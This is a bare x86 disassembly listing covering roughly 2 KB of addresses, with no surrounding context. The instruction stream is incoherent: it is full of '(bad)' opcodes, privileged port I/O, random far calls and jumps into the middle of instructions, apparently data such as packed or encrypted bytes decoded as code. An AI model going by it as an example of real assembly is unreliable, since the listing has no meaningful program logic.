  41b2fa:	outs   dx,DWORD PTR ds:[esi]
  41b2fb:	retf   
  41b2fc:	and    bh,BYTE PTR [edi]
  41b2fe:	add    DWORD PTR [eax-0x7f2e389b],ecx
  41b304:	add    BYTE PTR [ecx+0x1a],dl
  41b307:	or     al,0x55
  41b309:	xor    BYTE PTR [ebx+0x6c9ee8fc],dl
  41b30f:	ds (bad) 
  41b311:	nop
  41b312:	lahf   
  41b313:	add    ebp,DWORD PTR [ebx+0x589cbe6a]
  41b319:	stc    
  41b31a:	(bad)  
  41b31b:	or     bh,bl
  41b31d:	mov    BYTE PTR [ebx-0x66],cl
  41b320:	lds    ebx,FWORD PTR [ecx+edi*1-0x47]
  41b324:	call   0x9782c9c9
  41b329:	mov    ch,0x37
  41b32b:	(bad)  
  41b32c:	fcomp  QWORD PTR [edi+0x72]
  41b32f:	cs enter 0xcb1d,0xb8
  41b334:	out    dx,eax
  41b335:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b336:	popf   
  41b337:	in     al,dx
  41b338:	mov    edi,0x3e6f4ff3
  41b33d:	sbb    dl,BYTE PTR [esi-0x2f24cceb]
  41b343:	popa   
  41b344:	hlt    
  41b345:	ja     0x41b321
  41b347:	hlt    
  41b348:	mov    al,BYTE PTR [edx-0x13]
  41b34b:	(bad)  
  41b34d:	(bad)  
  41b34e:	retf   0x8dd
  41b351:	test   eax,0x2c19a5a1
  41b356:	mov    ds,WORD PTR [esi-0x6018f68d]
  41b35c:	mov    ebp,DWORD PTR [eax+0x49]
  41b35f:	(bad)  
  41b360:	clc    
  41b361:	cwde   
  41b362:	call   0x3a7f:0xf2f1421
  41b369:	jae    0x41b319
  41b36b:	push   edi
  41b36c:	out    dx,al
  41b36d:	scas   al,BYTE PTR es:[edi]
  41b36e:	and    ebx,DWORD PTR [eax+eax*2]
  41b371:	dec    edi
  41b372:	mov    ecx,0x39840572
  41b377:	or     bh,BYTE PTR [eax-0x7eac7f35]
  41b37d:	je     0x41b3e5
  41b37f:	inc    edi
  41b380:	jne    0x41b3f4
  41b382:	xchg   ebp,eax
  41b383:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b384:	dec    esp
  41b385:	mov    ebp,0x4215451
  41b38a:	cmp    esi,DWORD PTR [eax]
  41b38c:	add    al,0xa
  41b38e:	outs   dx,BYTE PTR ds:[esi]
  41b38f:	xchg   ecx,eax
  41b390:	pop    esp
  41b391:	mov    ecx,0xb628c5ad
  41b396:	sbb    al,0xdd
  41b398:	in     al,0x13
  41b39a:	(bad)  
  41b39b:	jge    0x41b35c
  41b39d:	idiv   dl
  41b39f:	mov    ebx,0x241f72d1
  41b3a4:	rcr    BYTE PTR [ebp-0x5c9d19ca],0xb3
  41b3ab:	dec    esp
  41b3ac:	fdiv   QWORD PTR [esi-0x4867f87e]
  41b3b2:	adc    al,0xb1
  41b3b4:	int    0x65
  41b3b6:	test   DWORD PTR [eax+0x37],eax
  41b3b9:	aad    0x81
  41b3bb:	or     BYTE PTR [esi-0x7b],dl
  41b3be:	inc    eax
  41b3bf:	loopne 0x41b3d8
  41b3c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3c2:	ret    
  41b3c3:	sbb    edx,DWORD PTR [esi+eax*1-0x58]
  41b3c7:	add    eax,0x2570610f
  41b3cc:	inc    esp
  41b3cd:	call   0x7e14:0x42eadce7
  41b3d4:	ret    
  41b3d5:	in     eax,dx
  41b3d6:	sahf   
  41b3d7:	push   0x2
  41b3d9:	mov    cl,0xe4
  41b3db:	and    BYTE PTR [ebx+0xa4b7629],al
  41b3e1:	aaa    
  41b3e2:	xor    eax,0x4def39c1
  41b3e7:	(bad)  
  41b3e8:	fnstsw WORD PTR [ecx+0x279ddea2]
  41b3ee:	repnz movs BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41b3f1:	aaa    
  41b3f2:	sti    
  41b3f3:	or     ecx,DWORD PTR [ebx-0x367339af]
  41b3f9:	arpl   WORD PTR ds:0x3fe4f83d,sp
  41b3ff:	mov    bh,0x9d
  41b401:	cmp    esp,ebx
  41b403:	(bad)  
  41b404:	mov    ch,0x3
  41b406:	push   es
  41b407:	pushf  
  41b408:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b409:	loop   0x41b400
  41b40b:	lock add al,0x65
  41b40e:	jne    0x41b3cd
  41b410:	je     0x41b45e
  41b412:	sbb    bl,dh
  41b414:	mov    al,ds:0x71179434
  41b419:	das    
  41b41a:	outs   dx,DWORD PTR ds:[esi]
  41b41b:	add    DWORD PTR [eax-0x1327e86c],0x26014c4e
  41b425:	push   eax
  41b426:	mov    dh,0x91
  41b428:	(bad)  
  41b42a:	add    al,0xbf
  41b42c:	pop    eax
  41b42d:	imul   edx,edi,0x2fa617c8
  41b433:	ins    DWORD PTR es:[edi],dx
  41b434:	mov    ch,0x7b
  41b436:	dec    edx
  41b437:	mov    esi,DWORD PTR [edx+0x2d]
  41b43a:	fs cld 
  41b43c:	retf   
  41b43d:	xor    ebp,ecx
  41b43f:	or     al,ah
  41b441:	sti    
  41b442:	aas    
  41b443:	arpl   bx,bx
  41b445:	mov    al,0xea
  41b447:	jns    0x41b499
  41b449:	mov    ch,0x63
  41b44b:	cmp    eax,0x58fb2995
  41b450:	cmp    DWORD PTR [edx+0x5f],0xe0033818
  41b457:	mov    edi,0x6f869950
  41b45c:	xchg   esp,eax
  41b45d:	xchg   ecx,eax
  41b45e:	dec    edi
  41b45f:	pop    edi
  41b460:	sbb    al,0xeb
  41b462:	xchg   ebx,eax
  41b463:	fnstsw WORD PTR fs:[edi+0x31]
  41b467:	adc    al,0xe5
  41b469:	imul   ebx,DWORD PTR [edx+0x7d61dd0a],0xffffffb2
  41b470:	dec    ecx
  41b471:	ss adc ah,BYTE PTR gs:[ebp-0x5f]
  41b476:	dec    eax
  41b477:	(bad)  
  41b478:	sbb    eax,0x96e81f5b
  41b47d:	inc    edi
  41b47e:	cli    
  41b47f:	pop    esp
  41b480:	rcl    al,cl
  41b482:	popf   
  41b483:	cmp    DWORD PTR [ecx+0x2d],edi
  41b486:	sbb    DWORD PTR [ebx+0x49472942],0xffffffb0
  41b48d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b48e:	lds    edx,FWORD PTR [edi]
  41b490:	data16 sbb al,BYTE PTR [ecx-0x5f]
  41b494:	jbe    0x41b4bd
  41b496:	in     al,0x8e
  41b498:	inc    ebx
  41b499:	push   eax
  41b49a:	popf   
  41b49b:	ret    0xe518
  41b49e:	sub    DWORD PTR ds:0x3ccda539,0x39
  41b4a5:	shl    DWORD PTR [edx+0x58],1
  41b4a8:	mul    BYTE PTR [esi+0x4b]
  41b4ab:	in     al,0xe7
  41b4ad:	ds jne 0x41b460
  41b4b0:	jb     0x41b433
  41b4b2:	jo     0x41b52d
  41b4b4:	fwait
  41b4b5:	xor    edx,eax
  41b4b7:	packuswb mm4,QWORD PTR [edi-0x7ba870a6]
  41b4be:	stos   DWORD PTR es:[edi],eax
  41b4bf:	pop    ebx
  41b4c0:	popa   
  41b4c1:	sub    edi,edx
  41b4c3:	lods   al,BYTE PTR ds:[esi]
  41b4c4:	inc    ebx
  41b4c5:	clc    
  41b4c6:	aad    0x59
  41b4c8:	imul   DWORD PTR [eax+0x3a]
  41b4cb:	inc    esi
  41b4cc:	fstp   DWORD PTR [esi-0x5eee620e]
  41b4d2:	rcl    ah,1
  41b4d4:	pop    es
  41b4d5:	push   eax
  41b4d6:	cs xchg ebx,eax
  41b4d8:	aas    
  41b4d9:	aas    
  41b4da:	adc    dh,0xfe
  41b4dd:	mov    eax,ds:0x3ff777b4
  41b4e2:	and    eax,edx
  41b4e4:	push   eax
  41b4e5:	in     al,0x3
  41b4e7:	mov    bl,0x68
  41b4e9:	das    
  41b4ea:	in     al,dx
  41b4eb:	clc    
  41b4ec:	addr16 arpl dx,ax
  41b4ef:	dec    ebp
  41b4f0:	and    DWORD PTR [edi-0x5438a8eb],edi
  41b4f6:	sbb    DWORD PTR [eax],ecx
  41b4f8:	sbb    al,0x6
  41b4fa:	fst    st(4)
  41b4fc:	mov    WORD PTR [edi-0x582416e4],fs
  41b502:	lods   eax,DWORD PTR ds:[esi]
  41b503:	not    DWORD PTR [esi+0x4d]
  41b506:	retf   0x93a
  41b509:	fnsave [ecx+0x73]
  41b50c:	sbb    edx,DWORD PTR [edi+0x61]
  41b50f:	ror    BYTE PTR [esp+esi*8+0xf],0x82
  41b514:	cmp    ebx,DWORD PTR [esi+0x26]
  41b517:	or     eax,0x52190639
  41b51c:	das    
  41b51d:	xchg   ecx,eax
  41b51e:	mov    al,0x1f
  41b520:	jmp    0x275f:0xc6cb08d3
  41b527:	cli    
  41b528:	jns    0x41b4cf
  41b52a:	js     0x41b503
  41b52c:	stc    
  41b52d:	push   ss
  41b52e:	sub    dx,dx
  41b531:	jecxz  0x41b571
  41b533:	pop    esi
  41b534:	sahf   
  41b535:	dec    ebx
  41b536:	inc    edx
  41b537:	repnz xor ah,dl
  41b53a:	add    DWORD PTR [ebx-0x49a34613],0x66fe1592
  41b544:	xor    dh,BYTE PTR [esi+0x24a3f20c]
  41b54a:	xchg   esp,eax
  41b54b:	mov    ebx,0x801591f1
  41b550:	les    ebp,FWORD PTR [ecx-0x1e]
  41b553:	addr16 mov bh,0xca
  41b556:	adc    dl,BYTE PTR [edi]
  41b558:	push   ss
  41b559:	push   edi
  41b55a:	sbb    al,0x4b
  41b55c:	stos   DWORD PTR es:[edi],eax
  41b55d:	pop    edi
  41b55e:	out    dx,al
  41b55f:	dec    eax
  41b560:	push   edx
  41b561:	aad    0xd0
  41b563:	add    BYTE PTR [esi-0x1c],0x76
  41b567:	sbb    esp,ebp
  41b569:	pushfw 
  41b56b:	push   ebp
  41b56c:	dec    edi
  41b56d:	sub    dh,BYTE PTR ds:0xfb3fdbbb
  41b573:	inc    eax
  41b574:	rcl    BYTE PTR [edi-0x43],cl
  41b577:	leave  
  41b578:	push   ecx
  41b579:	push   esp
  41b57a:	add    eax,0x2f8c04d
  41b57f:	pop    edi
  41b580:	mov    dl,0x9
  41b582:	test   eax,0xfe5c587b
  41b587:	mov    DWORD PTR [ecx],edx
  41b589:	and    eax,0x5f218cff
  41b58e:	sub    eax,0x2b28749e
  41b593:	xor    al,dh
  41b595:	cmp    al,0x7f
  41b597:	mov    bh,BYTE PTR [esi+0x524e117a]
  41b59d:	(bad)  
  41b59e:	cli    
  41b59f:	pop    ecx
  41b5a0:	xchg   ebx,eax
  41b5a1:	xchg   esp,eax
  41b5a2:	dec    ecx
  41b5a3:	xchg   esi,eax
  41b5a4:	loope  0x41b5d0
  41b5a6:	scas   eax,DWORD PTR es:[edi]
  41b5a7:	adc    BYTE PTR [ebx-0x28eed523],ah
  41b5ad:	fild   DWORD PTR [esi]
  41b5af:	dec    edx
  41b5b0:	push   0x89125ddb
  41b5b5:	clc    
  41b5b6:	lea    eax,ss:[edi+0x15d7b35b]
  41b5bd:	inc    esp
  41b5be:	inc    esp
  41b5bf:	fist   WORD PTR [ebx-0x74]
  41b5c2:	mul    DWORD PTR cs:[ebx+0x38]
  41b5c6:	js     0x41b59c
  41b5c8:	sub    al,0x55
  41b5ca:	test   al,ah
  41b5cc:	leave  
  41b5cd:	and    ch,BYTE PTR [edi+0x4e]
  41b5d0:	ss add esi,edi
  41b5d3:	ret    0x4d06
  41b5d6:	sbb    BYTE PTR [ebx-0x3b7b0f38],bl
  41b5dc:	cwde   
  41b5dd:	sbb    dh,BYTE PTR [ecx+edx*1]
  41b5e0:	stc    
  41b5e1:	in     al,dx
  41b5e2:	ins    BYTE PTR es:[edi],dx
  41b5e3:	xor    al,0xee
  41b5e5:	jnp    0x41b637
  41b5e7:	cdq    
  41b5e8:	or     DWORD PTR [edx-0xa142cea],ebx
  41b5ee:	inc    ecx
  41b5ef:	or     al,0xc
  41b5f1:	fimul  WORD PTR [eax]
  41b5f3:	mov    esi,0x737882a1
  41b5f8:	jmp    0xff25:0x94714a0c
  41b5ff:	(bad)  
  41b600:	mul    esp
  41b602:	stc    
  41b603:	clc    
  41b604:	mov    bh,0x22
  41b606:	aam    0xdc
  41b608:	cmp    al,0x88
  41b60a:	cmp    bh,cl
  41b60c:	or     ch,BYTE PTR [bp+di-0x1b]
  41b610:	fdivr  DWORD PTR [edx]
  41b612:	les    edx,FWORD PTR gs:[ebx]
  41b615:	jno    0x41b68b
  41b617:	fs dec esi
  41b619:	fstp   DWORD PTR [ebx-0x1d]
  41b61c:	mov    edi,?
  41b61e:	cwde   
  41b61f:	cmp    al,0x23
  41b621:	stos   DWORD PTR es:[edi],eax
  41b622:	mov    al,ds:0x31b69ba5
  41b627:	mov    edx,0xf50f57ed
  41b62c:	cmp    esp,DWORD PTR ds:0x64e30d22
  41b632:	jmp    0x41b62d
  41b634:	push   ebp
  41b635:	and    eax,0xceaca839
  41b63a:	adc    al,0xf6
  41b63c:	sbb    al,0xb7
  41b63e:	push   0x5011033f
  41b643:	add    BYTE PTR [esi+esi*8+0x3920c77e],al
  41b64a:	in     eax,dx
  41b64b:	add    ebx,DWORD PTR [ecx+ebp*2-0x46]
  41b64f:	ins    BYTE PTR es:[edi],dx
  41b650:	ret    0x5bb3
  41b653:	cmp    BYTE PTR [edx-0x6d],bl
  41b656:	bound  ecx,QWORD PTR [edx-0x3f5e2498]
  41b65c:	in     al,0x53
  41b65e:	and    esi,DWORD PTR [ecx-0x8]
  41b661:	jns    0x41b647
  41b663:	call   0xe3e0:0x159252fa
  41b66a:	push   ebx
  41b66b:	inc    esp
  41b66c:	(bad)  [ecx+0xd]
  41b66f:	call   0xd9ff:0x4dfa3622
  41b676:	sbb    al,0x74
  41b678:	adc    DWORD PTR [esi],ecx
  41b67a:	dec    edi
  41b67b:	add    eax,0xc3f3a67e
  41b680:	inc    edi
  41b681:	xchg   edi,eax
  41b682:	cdq    
  41b683:	mov    ebx,0xbaf0fd6f
  41b688:	outs   dx,DWORD PTR ds:[esi]
  41b689:	push   esi
  41b68a:	xor    ch,BYTE PTR [ecx+eiz*4-0x682397d9]
  41b691:	std    
  41b692:	out    dx,eax
  41b693:	ja     0x41b6dd
  41b695:	jmp    0x41b6b7
  41b697:	ja     0x41b61d
  41b699:	in     al,dx
  41b69a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b69b:	pop    ecx
  41b69c:	jge    0x41b69d
  41b69e:	sub    ah,BYTE PTR [ebp-0x3ecdc4c8]
  41b6a4:	pushf  
  41b6a5:	add    al,0xc
  41b6a7:	ss test al,0x11
  41b6aa:	in     al,0x9a
  41b6ac:	sbb    eax,0x81689c2c
  41b6b1:	sbb    edx,edx
  41b6b3:	in     al,0x5e
  41b6b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6b6:	rcr    dh,cl
  41b6b8:	xchg   DWORD PTR [edi],edi
  41b6ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6bc:	int    0x74
  41b6be:	and    esp,edx
  41b6c0:	push   0xf2401d64
  41b6c5:	fidivr WORD PTR [esi]
  41b6c7:	loop   0x41b6a2
  41b6c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6ca:	jle    0x41b665
  41b6cc:	movlps xmm0,QWORD PTR [edi+edx*4-0x62]
  41b6d1:	int3   
  41b6d2:	jecxz  0x41b723
  41b6d4:	dec    ebx
  41b6d5:	xchg   BYTE PTR [ebp+0x6af01559],bh
  41b6db:	cdq    
  41b6dc:	imul   ebx,esi,0xb8e18b6b
  41b6e2:	addr16 hlt 
  41b6e4:	test   BYTE PTR ds:0x24f79028,bh
  41b6ea:	jae    0x41b6a7
  41b6ec:	sub    BYTE PTR [eax-0x5e],cl
  41b6ef:	shr    DWORD PTR [ecx],cl
  41b6f1:	arpl   dx,bx
  41b6f3:	dec    ecx
  41b6f4:	push   cs
  41b6f5:	into   
  41b6f6:	stos   DWORD PTR es:[edi],eax
  41b6f7:	sub    bh,BYTE PTR [edi]
  41b6f9:	pusha  
  41b6fa:	xor    eax,DWORD PTR [edi]
  41b6fc:	or     al,0x45
  41b6fe:	test   DWORD PTR [eax],edx
  41b700:	in     eax,dx
  41b701:	dec    edx
  41b702:	das    
  41b703:	mov    cl,0xac
  41b705:	xor    bh,dh
  41b707:	mov    ecx,0xdd6ff44e
  41b70c:	jge    0x41b6b7
  41b70e:	or     al,0xc1
  41b710:	jle    0x41b6a6
  41b712:	iret   
  41b713:	aad    0x60
  41b715:	add    eax,0x6ce85204
  41b71a:	xchg   BYTE PTR [eax+0x3b],al
  41b71d:	push   esp
  41b71e:	in     eax,0x61
  41b720:	jbe    0x41b737
  41b722:	xchg   edx,eax
  41b723:	add    BYTE PTR [eax+0x4d],dh
  41b726:	int    0xc5
  41b728:	xchg   ecx,esi
  41b72a:	fnsave [ecx]
  41b72c:	add    al,0x79
  41b72e:	or     DWORD PTR [ecx-0x7f8580d],ebp
  41b734:	iret   
  41b735:	jno    0x41b788
  41b737:	push   edi
  41b738:	add    ah,BYTE PTR [ebp+0x32]
  41b73b:	mov    eax,cs
  41b73d:	pop    esi
  41b73e:	pop    esp
  41b73f:	ds mov dl,0x83
  41b742:	or     eax,0xb50583f8
  41b747:	mov    ds:0xed20810d,eax
  41b74c:	and    dh,cl
  41b74e:	sbb    ecx,DWORD PTR [edx-0x460228f1]
  41b754:	or     eax,0x93952d0b
  41b759:	mov    ch,BYTE PTR [eax+0x6ac32e69]
  41b75f:	mov    dh,0x90
  41b761:	jle    0x41b7d3
  41b763:	loopne 0x41b78e
  41b765:	stos   DWORD PTR es:[edi],eax
  41b766:	or     edi,DWORD PTR [ecx]
  41b768:	js     0x41b75d
  41b76a:	jl     0x41b7ae
  41b76c:	dec    ebp
  41b76d:	inc    DWORD PTR [ebx-0x25]
  41b770:	pop    ss
  41b771:	lds    ebp,FWORD PTR [ecx-0x2a]
  41b774:	out    0xc9,eax
  41b776:	in     al,0xe
  41b778:	adc    DWORD PTR [ecx+0x36],ecx
  41b77b:	icebp  
  41b77c:	in     eax,0xbb
  41b77e:	add    eax,0x2ee01b12
  41b783:	retf   
  41b784:	mov    WORD PTR [eax+edx*8-0x68],ds
  41b788:	mov    ds:0xf09b5be9,al
  41b78d:	xchg   BYTE PTR [edi],bh
  41b78f:	xor    edx,0xffffffa2
  41b792:	iret   
  41b793:	repz (bad) 
  41b795:	in     al,0xc7
  41b797:	jae    0x41b80e
  41b799:	inc    edi
  41b79a:	inc    edi
  41b79b:	adc    esp,DWORD PTR [edx]
  41b79d:	xchg   ecx,eax
  41b79e:	lea    ebx,[edi-0x5e]
  41b7a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7a2:	(bad)  
  41b7a3:	mov    ecx,0xb4178a0
  41b7a8:	and    cl,0x37
  41b7ab:	adc    DWORD PTR [bp-0x7f53],ebp
  41b7b0:	cld    
  41b7b1:	jg     0x41b82a
  41b7b3:	lods   al,BYTE PTR ds:[esi]
  41b7b4:	mov    ds,eax
  41b7b6:	add    cl,BYTE PTR [ecx+0x3c]
  41b7b9:	push   edi
  41b7ba:	xchg   edx,eax
  41b7bb:	adc    edx,DWORD PTR [eax-0x68]
  41b7be:	es ret 0xe2f2
  41b7c2:	mov    edx,edi
  41b7c4:	or     ebp,DWORD PTR [edi+0x6b0ac81a]
  41b7ca:	pop    esi
  41b7cb:	jmp    0x41b76b
  41b7cd:	nop
  41b7ce:	pop    ds
  41b7cf:	push   ebp
  41b7d0:	mov    eax,0xd2c5c07e
  41b7d5:	mov    al,ds:0xc7b1a831
  41b7da:	popf   
  41b7db:	fs pop es
  41b7dd:	mov    ch,0x13
  41b7df:	mov    ch,0xe2
  41b7e1:	push   ss
  41b7e2:	jmp    0xbdf0:0x4d754709
  41b7e9:	ss adc eax,0xa3cca1f3
  41b7ef:	mov    edi,0xeaaa557d
  41b7f4:	rcl    BYTE PTR [esi],1
  41b7f6:	jle    0x41b826
  41b7f8:	stc    
  41b7f9:	lock xchg edx,eax
  41b7fb:	xchg   ebp,eax
  41b7fc:	cwde   
  41b7fd:	dec    eax
  41b7fe:	hlt    
  41b7ff:	adc    BYTE PTR [ecx-0x78],ch
  41b802:	loopne 0x41b7cb
  41b804:	popf   
  41b805:	int3   
  41b806:	dec    edx
  41b807:	js     0x41b847
  41b809:	pop    edx
  41b80a:	mov    esp,0xfcae5798
  41b80f:	imul   ecx,DWORD PTR [ecx-0x66],0x19020d7f
  41b816:	adc    eax,0x5207461d
  41b81b:	ins    DWORD PTR es:[edi],dx
  41b81c:	dec    esi
  41b81d:	je     0x41b86b
  41b81f:	adc    DWORD PTR [ecx],edi
  41b821:	icebp  
  41b822:	or     BYTE PTR [ebp+ebx*2+0x38],cl
  41b826:	pop    ecx
  41b827:	daa    
  41b828:	ins    DWORD PTR es:[edi],dx
  41b829:	inc    esp
  41b82a:	(bad)  
  41b82b:	xchg   ebx,eax
  41b82c:	inc    ebp
  41b82d:	aaa    
  41b82e:	(bad)  
  41b82f:	push   esp
  41b830:	ins    BYTE PTR es:[edi],dx
  41b831:	ret    0x8d8f
  41b834:	xchg   ebp,eax
  41b835:	in     eax,dx
  41b836:	sahf   
  41b837:	jle    0x41b86b
  41b839:	pop    ss
  41b83a:	add    BYTE PTR [eax*2-0x7c1b40b1],dl
  41b841:	mov    bh,BYTE PTR [esi]
  41b843:	cmc    
  41b844:	test   eax,0xac079f1a
  41b849:	jns    0x41b812
  41b84b:	mov    BYTE PTR [ecx-0x485354e1],ah
  41b851:	je     0x41b89e
  41b853:	mov    ch,0x95
  41b855:	fiadd  WORD PTR [edi]
  41b857:	push   edx
  41b858:	stos   DWORD PTR es:[edi],eax
  41b859:	push   edi
  41b85a:	push   ss
  41b85b:	inc    ebp
  41b85c:	mov    ebp,0xe23c38f5
  41b861:	xchg   ecx,eax
  41b862:	fcom   DWORD PTR [ebp-0x76]
  41b865:	leave  
  41b866:	xor    DWORD PTR [ebx-0x2e],0x24a36c46
  41b86d:	mov    bl,0x89
  41b86f:	inc    edi
  41b870:	or     DWORD PTR [esi-0x64],esi
  41b873:	sahf   
  41b874:	fsubr  QWORD PTR [eax-0x15]
  41b877:	std    
  41b878:	xchg   BYTE PTR [eax],dl
  41b87a:	shl    ah,0x6c
  41b87d:	mov    eax,ds:0x74341731
  41b882:	sub    eax,0x379cd24d
  41b887:	cmp    al,BYTE PTR [ecx]
  41b889:	inc    esi
  41b88a:	push   ebp
  41b88b:	or     BYTE PTR [ecx],bh
  41b88d:	adc    ebp,ebp
  41b88f:	js     0x41b868
  41b891:	push   esp
  41b892:	lods   eax,DWORD PTR ds:[esi]
  41b893:	fisubr DWORD PTR [edx+0x7e]
  41b896:	(bad)  
  41b897:	sbb    ebp,eax
  41b899:	out    dx,al
  41b89a:	sahf   
  41b89b:	sbb    ah,BYTE PTR [eax]
  41b89d:	xchg   ebx,eax
  41b89e:	add    esp,esp
  41b8a0:	ror    bh,cl
  41b8a2:	xchg   esp,eax
  41b8a3:	xor    al,0xe7
  41b8a5:	add    ebx,DWORD PTR [edx-0x6d]
  41b8a8:	xchg   BYTE PTR [ecx+0x77],ch
  41b8ab:	xor    ebx,DWORD PTR [eax]
  41b8ad:	pop    eax
  41b8ae:	pop    ds
  41b8af:	div    DWORD PTR [ecx-0x47]
  41b8b2:	(bad)  
  41b8b3:	mov    esi,0xec052c5d
  41b8b8:	fldenv ds:0x2b0bf541
  41b8be:	add    ebp,DWORD PTR [ebx+0x57]
  41b8c1:	mov    DWORD PTR [edi-0x3b],edx
  41b8c4:	xor    eax,0x396e45d7
  41b8c9:	xlat   BYTE PTR ds:[ebx]
  41b8ca:	pusha  
  41b8cb:	test   eax,0x9b5d1782
  41b8d0:	jmp    FWORD PTR ss:[esi+0x36]
  41b8d4:	ds fstp TBYTE PTR fs:[esi]
  41b8d8:	scas   al,BYTE PTR es:[edi]
  41b8d9:	ss pop ecx
  41b8db:	or     eax,0xa4bf2bc
  41b8e0:	call   0x239d:0xd0fafbd1
  41b8e7:	add    ecx,ebx
  41b8e9:	xor    eax,0x5e5853c4
  41b8ee:	jo     0x41b893
  41b8f0:	xchg   esi,eax
  41b8f1:	add    edi,esi
  41b8f3:	and    ch,BYTE PTR [esi-0x23]
  41b8f6:	fild   DWORD PTR [edi+0x8]
  41b8f9:	mov    bh,0x34
  41b8fb:	test   al,0x72
  41b8fd:	cmp    DWORD PTR [ebx],edx
  41b8ff:	cmp    ebx,edi
  41b901:	das    
  41b902:	popa   
  41b903:	jns    0x41b89e
  41b905:	and    esi,DWORD PTR [eax-0x6dd67a19]
  41b90b:	mov    ebp,eax
  41b90d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b90e:	cld    
  41b90f:	mov    bh,0x19
  41b911:	in     eax,0xc7
  41b913:	cmc    
  41b914:	iret   
  41b915:	rcr    BYTE PTR ss:[edx],0x47
  41b919:	adc    eax,0x931619c5
  41b91e:	lahf   
  41b91f:	rcl    BYTE PTR [edx+0x20],cl
  41b922:	inc    ebx
  41b923:	inc    edi
  41b924:	gs cmc 
  41b926:	mov    cl,0xb9
  41b928:	(bad)  
  41b929:	pop    edi
  41b92a:	dec    eax
  41b92b:	sbb    eax,0x974bd360
  41b930:	lea    esp,[esi-0x2e58b15a]
  41b936:	push   esp
  41b937:	xchg   esi,eax
  41b938:	or     al,0xcd
  41b93a:	fist   DWORD PTR [eax+0x61cd1f3e]
  41b940:	and    eax,0x554c8635
  41b945:	cmp    BYTE PTR [edx-0x7d],0xd5
  41b949:	ins    BYTE PTR es:[edi],dx
  41b94a:	mov    al,ds:0xf82be08b
  41b94f:	xchg   edi,eax
  41b950:	xchg   esi,eax
  41b951:	pop    es
  41b952:	mov    edi,DWORD PTR [ebp+0x3323ef01]
  41b958:	jmp    0x94f2:0xcbd8e09f
  41b95f:	sahf   
  41b960:	and    al,0x6f
  41b962:	adc    DWORD PTR [ebx+eax*8],esi
  41b965:	or     al,al
  41b967:	xchg   edi,eax
  41b968:	int    0x22
  41b96a:	inc    esi
  41b96b:	popa   
  41b96c:	pop    esp
  41b96d:	jecxz  0x41b90f
  41b96f:	lock mov bl,0x1e
  41b972:	(bad)  
  41b973:	lea    ebp,[esi]
  41b975:	inc    esi
  41b976:	loopne 0x41b94a
  41b978:	mov    cl,0x9c
  41b97a:	loope  0x41b937
  41b97c:	mov    bh,0xc6
  41b97e:	int    0x91
  41b980:	lea    eax,[edx]
  41b982:	es lahf 
  41b984:	or     esp,esp
  41b986:	jmp    0xd5f9:0xb233cfd1
  41b98d:	ds pop ebp
  41b98f:	sub    ebx,edi
  41b991:	mov    dl,0x11
  41b993:	or     ah,BYTE PTR [esi]
  41b995:	loopne 0x41b947
  41b997:	inc    edi
  41b998:	sbb    DWORD PTR [edi-0x1a],ecx
  41b99b:	ins    BYTE PTR es:[edi],dx
  41b99c:	ror    BYTE PTR [ebx+0x6b],0xc1
  41b9a0:	adc    DWORD PTR [edi],ecx
  41b9a2:	or     DWORD PTR [esi-0x14],ecx
  41b9a5:	shl    BYTE PTR [edx-0x293fbf2f],0x78
  41b9ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9ad:	mov    ds:0xabaa22e2,al
  41b9b2:	and    BYTE PTR [eax+0xb],cl
  41b9b5:	enter  0xf2c1,0x19
  41b9b9:	cld    
  41b9ba:	pop    esp
  41b9bb:	test   al,0x6d
  41b9bd:	outs   dx,DWORD PTR ds:[esi]
  41b9be:	push   ebx
  41b9bf:	xor    eax,0x427f3a64
  41b9c4:	pop    edi
  41b9c5:	mov    dl,0x2f
  41b9c7:	xor    al,0x22
  41b9c9:	add    al,BYTE PTR ds:0x624cdb48
  41b9cf:	push   0xd435c615
  41b9d4:	sti    
  41b9d5:	cmp    dl,BYTE PTR [ebx+0x4f61d4d3]
  41b9db:	dec    esi
  41b9dc:	hlt    
  41b9dd:	push   0x22
  41b9df:	jl     0x41b970
  41b9e1:	cdq    
  41b9e2:	adc    ecx,DWORD PTR [ebp+0x26ec4bcc]
  41b9e8:	fidiv  WORD PTR [esi+edi*1]
  41b9eb:	pusha  
  41b9ec:	sar    cl,1
  41b9ee:	std    
  41b9ef:	data16 jg 0x41b97d
  41b9f2:	cmc    
  41b9f3:	ret    0xf363
  41b9f6:	jae    0x41b9eb
  41b9f8:	(bad)  [eax-0x26]
  41b9fb:	pop    ebx
  41b9fc:	fnstcw WORD PTR [eax-0x6a]
  41b9ff:	xor    DWORD PTR [esp+eiz*8+0x3e],esi
  41ba03:	jbe    0x41b9ea
  41ba05:	nop
  41ba06:	cmp    DWORD PTR ds:0xadf06863,ecx
  41ba0c:	nop
  41ba0d:	retf   
  41ba0e:	inc    ecx
  41ba0f:	sub    DWORD PTR gs:[esi+0x7c],ebx
  41ba13:	push   es
  41ba14:	mov    dl,0x86
  41ba16:	adc    DWORD PTR [edi-0x35cc568f],esp
  41ba1c:	daa    
  41ba1d:	push   edi
  41ba1e:	or     esp,eax
  41ba20:	add    BYTE PTR [edi-0x30],dl
  41ba23:	sbb    al,0x6e
  41ba25:	pop    edi
  41ba26:	push   cs
  41ba27:	xchg   ecx,eax
  41ba28:	aam    0x81
  41ba2a:	xchg   ebx,eax
  41ba2b:	xchg   edx,eax
  41ba2c:	pop    edx
  41ba2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba2e:	nop    edx
  41ba31:	xor    eax,0x3a0463a
  41ba36:	mov    ah,0x1e
  41ba38:	jmp    0xd528:0x5129fbdc
  41ba3f:	or     DWORD PTR [edx-0x26],0xffffffc3
  41ba43:	sub    edx,ecx
